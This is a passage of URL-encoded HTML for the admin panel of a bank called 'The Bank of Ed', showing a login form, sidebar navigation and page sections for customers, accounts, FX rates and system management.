black%2F50%20backdrop-blur-sm%20flex%20items-center%20justify-center%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22modal-content%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20w-full%20max-w-md%20max-h-%5B90vh%5D%20overflow-y-auto%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20AUTH%20VIEW%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22view-auth%5C%22%20class%3D%5C%22hidden%20min-h-screen%20flex%20items-center%20justify-center%20bg-gradient-to-br%20from-dark-900%20via-dark-800%20to-dark-950%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22w-full%20max-w-md%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22text-center%20mb-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22inline-flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-7%20h-7%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-3xl%20font-bold%20text-white%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-400%20mt-2%5C%22%3EAdministration%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20overflow-hidden%20p-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22login-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.AuthPage.handleLogin(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22space-y-5%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EUsername%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22admin%5C%22%20autofocus%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EPassword%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22Enter%20password%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22login-errors%5C%22%20class%3D%5C%22mt-4%20text-sm%20text-red-600%20hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20class%3D%5C%22w-full%20mt-6%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20In%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20APP%20SHELL%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22app-shell%5C%22%20class%3D%5C%22hidden%20flex%20h-screen%20overflow-hidden%5C%22%3E%5Cn%5Cn%20%20%20%20%3C!--%20Mobile%20Header%20--%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22lg%3Ahidden%20fixed%20top-0%20left-0%20right-0%20z-30%20bg-dark-900%20text-white%20flex%20items-center%20justify-between%20px-4%20py-3%5C%22%3E%5Cn%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22p-2%20hover%3Abg-dark-800%20rounded-lg%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%206h16M4%2012h16M4%2018h16%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-8%20h-8%20bg-red-600%20rounded-lg%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cspan%20class%3D%5C%22font-semibold%5C%22%3EAdmin%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20Overlay%20(mobile)%20--%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22sidebar-overlay%5C%22%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-30%20bg-black%2F50%20lg%3Ahidden%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20--%3E%5Cn%20%20%20%20%3Caside%20id%3D%5C%22sidebar%5C%22%20class%3D%5C%22fixed%20lg%3Astatic%20inset-y-0%20left-0%20z-40%20w-64%20bg-dark-900%20text-white%20flex%20flex-col%20transform%20-translate-x-full%20lg%3Atranslate-x-0%20transition-transform%20duration-200%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-6%20flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%20h-10%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22font-bold%20text-lg%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%5C%22%3EAdmin%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cnav%20class%3D%5C%22flex-1%20px-3%20space-y-1%20mt-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20data-nav%3D%5C%22customers%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2020h5v-2a3%203%200%2000-5.356-1.857M17%2020H7m10%200v-2c0-.656-.126-1.283-.356-1.857M7%2020H2v-2a3%203%200%20015.356-1.857M7%2020v-2c0-.656.126-1.283.356-1.857m0%200a5.002%205.002%200%20019.288%200M15%207a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ECustomers%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Faccounts%5C%22%20data-nav%3D%5C%22accounts%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M3%2010h18M7%2015h1m4%200h1m-7%204h12a3%203%200%20003-3V8a3%203%200%2000-3-3H6a3%203%200%2000-3%203v8a3%203%200%20003%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EAccounts%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Ffx-rates%5C%22%20data-nav%3D%5C%22fx-rates%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%208c-1.657%200-3%20.895-3%202s1.343%202%203%202%203%20.895%203%202-1.343%202-3%202m0-8c1.11%200%202.08.402%202.599%201M12%208V7m0%201v8m0%200v1m0-1c-1.11%200-2.08-.402-2.599-1M21%2012a9%209%200%2011-18%200%209%209%200%200118%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EFX%20Rates%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fsystem%5C%22%20data-nav%3D%5C%22system%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%204v5h.582m15.356%202A8.001%208.001%200%20004.582%209m0%200H9m11%2011v-5h-.581m0%200a8.003%208.003%200%2001-15.357-2m15.357%202H15%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESystem%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%3C%2Fnav%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20border-t%20border-dark-800%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-3%20px-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-9%20h-9%20bg-dark-700%20rounded-full%20flex%20items-center%20justify-center%20text-sm%20font-semibold%5C%22%20id%3D%5C%22sidebar-avatar%5C%22%3EA%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22min-w-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20font-medium%20truncate%5C%22%20id%3D%5C%22sidebar-admin-name%5C%22%3EAdmin%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.logout()%5C%22%20class%3D%5C%22w-full%20flex%20items-center%20gap-3%20px-4%20py-2.5%20rounded-xl%20text-dark-400%20hover%3Atext-red-400%20hover%3Abg-dark-800%20transition-colors%20text-sm%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2016l4-4m0%200l-4-4m4%204H7m6%204v1a3%203%200%2001-3%203H6a3%203%200%2001-3-3V7a3%203%200%20013-3h4a3%203%200%20013%203v1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20Out%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Faside%3E%5Cn%5Cn%20%20%20%20%3C!--%20Main%20Content%20--%3E%5Cn%20%20%20%20%3Cmain%20class%3D%5C%22flex-1%20overflow-y-auto%20pt-14%20lg%3Apt-0%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20sm%3Ap-6%20lg%3Ap-8%20max-w-7xl%20mx-auto%5C%22%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customers%20List%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customers%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ECustomers%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20customer%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22customer-search%5C%22%20placeholder%3D%5C%22Search...%5C%22%20class%3D%5C%22px-4%20py-2.5%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%20w-48%5C%22%20onkeyup%3D%5C%22BankOfEdAdmin.CustomersPage.handleSearch(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customer%20Detail%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customer-detail%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20class%3D%5C%22inline-flex%20items-center%20gap-1%20text-red-600%20hover%3Atext-red-700%20text-sm%20font-medium%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2019l-7-7%207-7%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20Back%20to%20Customers%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customer-detail-content%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Accounts%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-accounts%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EAll%20Accounts%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EView%20and%20manage%20all%20bank%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20FX%20Rates%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-fx-rates%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EFX%20Rates%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20foreign%20exchange%20rates%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.FxRatesPage.showAddModal()%5C%22%20class%3D%5C%22bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20px-5%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%204v16m8-8H4%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20Add%20Rate%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22fx-rates-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20System%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-system%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ESystem%20Management%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EIntegration%20settings%2C%20database%20operations%20and%20maintenance%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%20%